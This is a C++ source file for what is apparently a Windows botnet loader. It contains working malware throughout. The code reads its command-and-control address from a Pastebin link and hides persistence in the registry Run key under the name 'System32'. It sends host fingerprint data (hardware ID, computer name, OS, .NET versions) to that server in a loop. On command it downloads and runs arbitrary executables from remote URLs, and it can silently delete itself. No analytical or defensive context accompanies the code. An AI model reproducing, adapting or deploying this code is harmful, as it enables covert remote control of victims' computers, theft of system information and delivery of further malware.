#include <stdio.h>
#include <iostream>
#include <fstream>
#include "HTTPRequest.hpp"
#include <windows.h>
#include <Urlmon.h> 
#include <time.h>
#include <lm.h>
#include <vector>
#include <thread>
#pragma comment( lib, "Urlmon.lib" )
#pragma comment(lib, "netapi32.lib")


std::string responseToString(http::Response response) {
	char* gateFromPatebin = (char*)malloc(response.body.size() + 1);
	memcpy(gateFromPatebin, response.body.data(), response.body.size());
	gateFromPatebin[response.body.size()] = '\0';
	std::string responseFromGateString = gateFromPatebin;
	free(gateFromPatebin);
	return responseFromGateString;
}

std::string getHWID() {
	HW_PROFILE_INFO hwProfileInfo;
	if (GetCurrentHwProfile(&hwProfileInfo))
		return (std::string)hwProfileInfo.szHwProfileGuid;
}

std::string getComputerName() {
	TCHAR chrComputerName[MAX_COMPUTERNAME_LENGTH + 1];
	std::string strRetVal;
	DWORD dwBufferSize = MAX_COMPUTERNAME_LENGTH + 1;
	if (GetComputerName(chrComputerName, &dwBufferSize)) {
		strRetVal = chrComputerName;
	}else {
		strRetVal = "";
	}
	return(strRetVal);
}


std::string downloadFile(std::string url, std::string file) {
	const char* strUrl = url.c_str();
	const char* strFile = file.c_str(); // I had been testing with these, not currently using them
	HRESULT hr = URLDownloadToFile(NULL, url.c_str(), file.c_str(), 0, NULL);
	if (FAILED(hr)) {
		return "failed";
	}
	return "ok";
}
std::vector<std::string> explode(const std::string& delimiter, const std::string& str) {
	std::vector<std::string> arr;
	int strleng = str.length();
	int delleng = delimiter.length();
	if (delleng == 0)
		return arr;//no change
	int i = 0;
	int k = 0;
	while (i < strleng)
	{
		int j = 0;
		while (i + j < strleng && j < delleng && str[i + j] == delimiter[j])
			j++;
		if (j == delleng)//found delimiter
		{
			arr.push_back(str.substr(k, i - k));
			i += delleng;
			k = i;
		}else{
			i++;
		}
	}
	arr.push_back(str.substr(k, i - k));
	return arr;
}

bool replace(std::string& str, const std::string& from, const std::string& to) {
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos)
		return false;
	str.replace(start_pos, from.length(), to);
	return true;
}

std::string RandomString(int len) {
	srand(time(0));
	std::string str = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	std::string newstr;
	int pos;
	while (newstr.size() != len) {
		pos = ((rand() % (str.size() - 1)));
		newstr += str.substr(pos, 1);
	}
	return newstr;
}


std::string startNewProcess(std::string file) {
	STARTUPINFO si = {};
	si.cb = sizeof si;

	PROCESS_INFORMATION pi = {};
	const TCHAR* target = TEXT(file.c_str());

	if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
	{
		std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
		return "failed";
	}else{
		std::cout << "Process Executed Success" << std::endl;
		return "success";
	}

	std::cin.sync();
	std::cin.ignore();
}

bool GetWinMajorMinorVersion(DWORD& major, DWORD& minor) {
	bool bRetCode = false;
	LPBYTE pinfoRawData = 0;
	if (NERR_Success == NetWkstaGetInfo(NULL, 100, &pinfoRawData))
	{
		WKSTA_INFO_100* pworkstationInfo = (WKSTA_INFO_100*)pinfoRawData;
		major = pworkstationInfo->wki100_ver_major;
		minor = pworkstationInfo->wki100_ver_minor;
		::NetApiBufferFree(pinfoRawData);
		bRetCode = true;
	}
	return bRetCode;
}

std::string GetWindowsVersionString() {
	std::string     winver;
	OSVERSIONINFOEX osver;
	SYSTEM_INFO     sysInfo;
	typedef void(__stdcall *GETSYSTEMINFO) (LPSYSTEM_INFO);

	__pragma(warning(push))
		__pragma(warning(disable:4996))
		memset(&osver, 0, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	GetVersionEx((LPOSVERSIONINFO)&osver);
	__pragma(warning(pop))
		DWORD major = 0;
	DWORD minor = 0;
	if (GetWinMajorMinorVersion(major, minor))
	{
		osver.dwMajorVersion = major;
		osver.dwMinorVersion = minor;
	} else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2) {
		OSVERSIONINFOEXW osvi;
		ULONGLONG cm = 0;
		cm = VerSetConditionMask(cm, VER_MINORVERSION, VER_EQUAL);
		ZeroMemory(&osvi, sizeof(osvi));
		osvi.dwOSVersionInfoSize = sizeof(osvi);
		osvi.dwMinorVersion = 3;
		if (VerifyVersionInfoW(&osvi, VER_MINORVERSION, cm))
		{
			osver.dwMinorVersion = 3;
		}
	}

	GETSYSTEMINFO getSysInfo = (GETSYSTEMINFO)GetProcAddress(GetModuleHandle("kernel32.dll"), "GetNativeSystemInfo");
	if (getSysInfo == NULL)  getSysInfo = ::GetSystemInfo;
	getSysInfo(&sysInfo);

	if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows 10 Server";
	if (osver.dwMajorVersion == 10 && osver.dwMinorVersion >= 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 10";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012 R2";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 3 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8.1";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2012";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 8";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008 R2";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows 7";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType != VER_NT_WORKSTATION)  winver = "Windows Server 2008";
	if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0 && osver.wProductType == VER_NT_WORKSTATION)  winver = "Windows Vista";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2 && osver.wProductType == VER_NT_WORKSTATION
		&& sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)  winver = "Windows XP x64";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)   winver = "Windows Server 2003";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)   winver = "Windows XP";
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)   winver = "Windows 2000";
	if (osver.dwMajorVersion < 5)   winver = "unknown";

	if (osver.wServicePackMajor != 0){
		std::string sp;
		char buf[128] = { 0 };
		sp = " Service Pack ";
		sprintf_s(buf, sizeof(buf), "%hd", osver.wServicePackMajor);
		sp.append(buf);
		winver += sp;
	}

	return winver;
}


void addstartup()
{
	TCHAR path[100];
	GetModuleFileName(NULL, path, 100);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegSetValueEx(newValue, "System32", 0, REG_SZ, (LPBYTE)path, sizeof(path));
	RegCloseKey(newValue);
}

std::string ExePath() {
	char result[MAX_PATH];
	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
}
std::string ExeDir() {
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
	return std::string(buffer).substr(0, pos);
}



void uninstall() {
	TCHAR path[100];
	GetModuleFileName(NULL, path, 100);
	HKEY newValue;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
	RegDeleteValue(newValue, "System32");
	RegCloseKey(newValue);
	std::string remove = "START /B CMD.EXE /D /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
	std::cout << remove;
	system(remove.c_str());
}

std::string checkIfRegKeyExists(std::string key) {
	LONG lResult;
	HKEY hKey;
	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(key.c_str()), 0, KEY_READ, &hKey);
	if (lResult != ERROR_SUCCESS){
		if (lResult == ERROR_FILE_NOT_FOUND) {
			return "false";
		}
	}
	return "true";
}










int main(int argc, char *argv[]){

	//int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
	//std::cout << "my directory is " << ExePath() << "\n";
	http::Request request("http://pastebin.com/raw/Yd76WVbu");
	http::Response response = request.send("GET");
	std::string gateFromPatebin = responseToString(response);

	std::string netFramework2 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
	std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
	std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
	std::string netFramework4 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
	//std::thread startupThread(addstartup);
	addstartup();

	while (true) {
		try {
			//CPU & GPU
			http::Request request2(gateFromPatebin);
			http::Response respons2e = request2.send("POST",
				"hwid=" + getHWID() +
				"&username=" + getComputerName() +
				"&nf2=" + netFramework2 +
				"&nf3=" + netFramework3 +
				"&nf35=" + netFramework35 +
				"&nf4=" + netFramework4 +
				"&os=" + GetWindowsVersionString() +
				"&botversion=2.0",
				{ "Content-Type: application/x-www-form-urlencoded" }
			);
			std::string responseFromGate = responseToString(respons2e);
			//TODO Handle newtask Function
			std::string substring = "newtask";
			if (responseFromGate.find(substring) != std::string::npos) {
				std::vector<std::string> v = explode(";", responseFromGate);
				std::cout << "New Task Found \n";
				std::string random_str = RandomString(10);
				std::string url(v[2]);
				std::string file((std::string)getenv("TEMP") + "\\" + random_str + ".exe");
				downloadFile(url, file);
				std::string started = startNewProcess(file);
				http::Request request2(gateFromPatebin);
				http::Response respons2e = request2.send("POST",
					"hwid=" + getHWID() +
					"&username=" + getComputerName() +
					"&ps=" + started +
					"&id=" + v[1],
					{ "Content-Type: application/x-www-form-urlencoded" }
				);
				std::cout << started;
			}
			else {
				std::string substring = "uninstall";
				if (responseFromGate.find(substring) != std::string::npos) {
					uninstall();

			
					return 0;
				}
				else {
					std::cout << "No new Task";
				}
			}
		}
		catch (const std::exception & e) {
			std::cerr << "Request failed, error: " << e.what() << std::endl;
		}
		Sleep(10000);
	}

}
